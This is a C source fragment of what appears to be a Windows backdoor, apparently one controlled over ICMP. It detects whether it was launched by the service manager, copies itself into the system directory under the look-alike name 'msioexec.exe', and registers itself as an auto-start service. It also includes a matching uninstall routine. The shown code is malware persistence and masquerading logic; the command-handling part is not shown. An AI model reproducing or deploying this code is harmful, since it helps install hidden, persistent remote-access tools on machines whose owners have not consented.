
// define winapi to use from dll
typedef DWORD (WINAPI pREGISTERSERVICEPROCESS) (DWORD,DWORD);
typedef LONG  (WINAPI *PROCNTQSIP)(HANDLE,UINT,PVOID,ULONG,PULONG);
typedef BOOL  (WINAPI *ENUMPROCESSMODULES) (HANDLE hProcess, HMODULE * lphModule, DWORD cb, LPDWORD lpcbNeeded);
typedef DWORD (WINAPI *GETMODULEBASENAME) (HANDLE hProcess, HMODULE hModule, LPTSTR lpBaseName, DWORD nSize);
// check selfstart mode
int StartFromService(void)//0 -> application, 1 -> services
{
	typedef struct
	{
		DWORD ExitStatus;
		DWORD PebBaseAddress;
		DWORD AffinityMask;
		DWORD BasePriority;
		ULONG UniqueProcessId;
		ULONG InheritedFromUniqueProcessId;
	}   PROCESS_BASIC_INFORMATION;
	
	PROCNTQSIP NtQueryInformationProcess;
	
	static ENUMPROCESSMODULES g_pEnumProcessModules = NULL ;
	static GETMODULEBASENAME g_pGetModuleBaseName = NULL ;
	
    HANDLE                    hProcess;
    PROCESS_BASIC_INFORMATION pbi;
	
    HINSTANCE hInst = LoadLibraryA("PSAPI.DLL");
    if(NULL == hInst ) return 0;
	
    g_pEnumProcessModules = (ENUMPROCESSMODULES)GetProcAddress(hInst ,"EnumProcessModules");
    g_pGetModuleBaseName = (GETMODULEBASENAME)GetProcAddress(hInst, "GetModuleBaseNameA");
    NtQueryInformationProcess = (PROCNTQSIP)GetProcAddress(GetModuleHandle("ntdll"), "NtQueryInformationProcess");
	
    if (!NtQueryInformationProcess) return 0;
	
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,GetCurrentProcessId());
    if(!hProcess)  return 0;
	
    if(NtQueryInformationProcess( hProcess, 0, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL)) return 0;
	
    CloseHandle(hProcess);
	
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pbi.InheritedFromUniqueProcessId);
	if(hProcess==NULL)	return 0;
	
	HMODULE hMod;
	char procName[255];
	unsigned long cbNeeded;
	
	if(g_pEnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) g_pGetModuleBaseName(hProcess, hMod, procName, sizeof(procName));
	
    CloseHandle(hProcess);
	
	if(strstr(procName,"services")) return 1; // start from ntservice
	
    return 0; // start from application
}





void WINAPI ICMP_CmdStart(DWORD dwArgc,LPTSTR *lpArgv)
{
	HANDLE    hThread;
	ServiceStatus.dwServiceType             = SERVICE_WIN32;
	ServiceStatus.dwCurrentState            = SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_PAUSE_CONTINUE;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwWin32ExitCode           = 0;
	ServiceStatus.dwCheckPoint              = 0;
	ServiceStatus.dwWaitHint                = 0;
	ServiceStatusHandle=RegisterServiceCtrlHandler(SERVER_NAME,CmdControl);
	if(ServiceStatusHandle==0)
	{
		OutputDebugString("RegisterServiceCtrlHandler Error !\n");
		return ;
	}
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	ServiceStatus.dwCheckPoint   = 0;
	ServiceStatus.dwWaitHint     = 0;

	if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
	{
		OutputDebugString("SetServiceStatus in CmdStart Error !\n");
		return ;
	}
	hThread=CreateThread(NULL,0,CmdService,NULL,0,NULL);
	if(hThread==NULL)
	{
		OutputDebugString("CreateThread in CmdStart Error !\n");
	}
	return ;
}
void WINAPI CmdControl(DWORD dwCode)
{
	switch(dwCode)
	{
	case SERVICE_CONTROL_PAUSE:
		ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
	case SERVICE_CONTROL_STOP:      
		WaitForSingleObject(hMutex,INFINITE);
		ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
		ServiceStatus.dwWin32ExitCode = 0;
		ServiceStatus.dwCheckPoint    = 0;
		ServiceStatus.dwWaitHint      = 0;
		if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
		{
			OutputDebugString("SetServiceStatus in CmdControl in Switch Error !\n");
		}
		ReleaseMutex(hMutex);
		CloseHandle(hMutex);
		return ;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default:
		break;
	}
	if(SetServiceStatus(ServiceStatusHandle,&ServiceStatus)==0)
	{
		OutputDebugString("SetServiceStatus in CmdControl out Switch Error !\n");
	}
	return ;
}




int InstallCmdService(void)
{
	SC_HANDLE        schSCManager;
	SC_HANDLE        schService;
	char             lpCurrentPath[MAX_PATH];
	char             lpImagePath[MAX_PATH];
	char             *lpHostName;
	WIN32_FIND_DATA  FileData;
	HANDLE           hSearch;
	DWORD            dwErrorCode;
	SERVICE_STATUS   InstallServiceStatus;
	bool             isServiceAlreadyExists=false;

	GetSystemDirectory(lpImagePath,MAX_PATH);
	strcat(lpImagePath,"\\msioexec.exe");
	lpHostName=NULL;

	printf("Transmitting File ... ");
	hSearch=FindFirstFile(lpImagePath,&FileData);
	if(hSearch==INVALID_HANDLE_VALUE)
	{
		GetModuleFileName(NULL,lpCurrentPath,MAX_PATH);
		if(CopyFile(lpCurrentPath,lpImagePath,FALSE)==0) 
		{
			dwErrorCode=GetLastError();
			if(dwErrorCode==5)
			{
				printf("Failure ... Access is Denied !\n");         
			}
			else
			{
				printf("Failure !\n");
			}
			return 1;
		}
		else
		{
			printf("Success !\n");
		}
	}
	else
	{
		printf("already Exists !\n");
		FindClose(hSearch);
	}
	schSCManager=OpenSCManager(lpHostName,NULL,SC_MANAGER_ALL_ACCESS);
	if(schSCManager==NULL)
	{
		printf("Open Service Control Manager Database Failure !\n");
		return 2;
	}
	printf("Creating Service .... ");
	schService=CreateService(schSCManager,SERVER_NAME,SERVER_NAME,SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS//|/*WATCH OUT THIS !!!!!!SERVICE_INTERACTIVE_PROCESS/************************************************************/
		,SERVICE_AUTO_START,
		SERVICE_ERROR_IGNORE,/*"msioexec.exe"*/lpImagePath,NULL,NULL,NULL,NULL,NULL); 
	if(schService==NULL)
	{
		dwErrorCode=GetLastError();
		if(dwErrorCode!=ERROR_SERVICE_EXISTS)
		{
			printf("Failure !\n");
			CloseServiceHandle(schSCManager);
			return 3;
		}
		else
		{
			printf("already Exists !\n");
			isServiceAlreadyExists=true;
			schService=OpenService(schSCManager,SERVER_NAME,SERVICE_START);
			if(schService==NULL)
			{
				printf("Opening Service .... Failure !\n");
				CloseServiceHandle(schSCManager);
				return 2;
			}
			//return true;//PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
		}
	}
	else
	{
		printf("Success !\n");
	}
	printf("Starting Service .... ");
	if(StartService(schService,0,NULL)==0)                         
	{
		dwErrorCode=GetLastError();
		if(dwErrorCode==ERROR_SERVICE_ALREADY_RUNNING)
		{
			printf("already Running !\n");
			CloseServiceHandle(schSCManager);  
			CloseServiceHandle(schService);
			return 0;
		}
	}
	else
	{
		printf("Pending ... ");
	}
	while(QueryServiceStatus(schService,&InstallServiceStatus)!=0)           
	{
		if(InstallServiceStatus.dwCurrentState==SERVICE_START_PENDING)
		{
			Sleep(100);
		}
		else
		{
			break;
		}
	}
	if(InstallServiceStatus.dwCurrentState!=SERVICE_RUNNING)
	{
		printf("Failure !\n");    
		CloseServiceHandle(schSCManager);
		CloseServiceHandle(schService);
		return 4;
	}
	else
	{
		printf("Success !\n");
	}
	CloseServiceHandle(schSCManager);
	CloseServiceHandle(schService);
	return 0;
}
void RemoveCmdService(void) 
{
	SC_HANDLE        schSCManager;
	SC_HANDLE        schService;
	char             lpImagePath[MAX_PATH];
	char             *lpHostName;
	WIN32_FIND_DATA  FileData;
	SERVICE_STATUS   RemoveServiceStatus;
	HANDLE           hSearch;
	DWORD            dwErrorCode;

	GetSystemDirectory(lpImagePath,MAX_PATH);
	strcat(lpImagePath,"\\msioexec.exe");
	lpHostName=NULL;

	schSCManager=OpenSCManager(lpHostName,NULL,SC_MANAGER_ALL_ACCESS);
	if(schSCManager==NULL)
	{
		printf("Opening SCM ......... ");
		dwErrorCode=GetLastError();
		if(dwErrorCode!=5)
		{
			printf("Failure !\n"); 
		}
		else
		{
			printf("Failuer ... Access is Denied !\n");
		}
		return ;
	}
	schService=OpenService(schSCManager,SERVER_NAME,SERVICE_ALL_ACCESS);
	if(schService==NULL) 
	{
		printf("Opening Service ..... ");
		dwErrorCode=GetLastError();
		if(dwErrorCode==1060)
		{
			printf("no Exists !\n");
		}
		else
		{
			printf("Failure !\n");
		}
		CloseServiceHandle(schSCManager);
	}
	else
	{
		printf("Stopping Service .... ");
		if(QueryServiceStatus(schService,&RemoveServiceStatus)!=0)
		{
			if(RemoveServiceStatus.dwCurrentState==SERVICE_STOPPED)
			{
				printf("already Stopped !\n"); 
			}
			else
			{
				printf("Pending ... ");
				if(ControlService(schService,SERVICE_CONTROL_STOP,&RemoveServiceStatus)!=0)
				{
					while(RemoveServiceStatus.dwCurrentState==SERVICE_STOP_PENDING)         
					{
						Sleep(10);
						QueryServiceStatus(schService,&RemoveServiceStatus);
					}
					if(RemoveServiceStatus.dwCurrentState==SERVICE_STOPPED)
					{
						printf("Success !\n");
					}
					else
					{
						printf("Failure !\n");
					}
				}
				else
				{
					printf("Failure !\n");          
				}
			}
		}
		else
		{
			printf("Query Failure !\n");
		}
		printf("Removing Service .... ");     
		if(DeleteService(schService)==0)
		{
			printf("Failure !\n");   
		}
		else
		{
			printf("Success !\n");
		}
	}
	CloseServiceHandle(schSCManager);        
	CloseServiceHandle(schService);
	printf("Removing File ....... ");
	Sleep(1500);
	hSearch=FindFirstFile(lpImagePath,&FileData);
	if(hSearch==INVALID_HANDLE_VALUE)
	{
		printf("no Exists !\n");
	}
	else
	{
		if(DeleteFile(lpImagePath)==0)
		{
			printf("Failure !\n");               
		}
		else
		{
			printf("Success !\n");
		}
		FindClose(hSearch);
	}
	return ;
}
















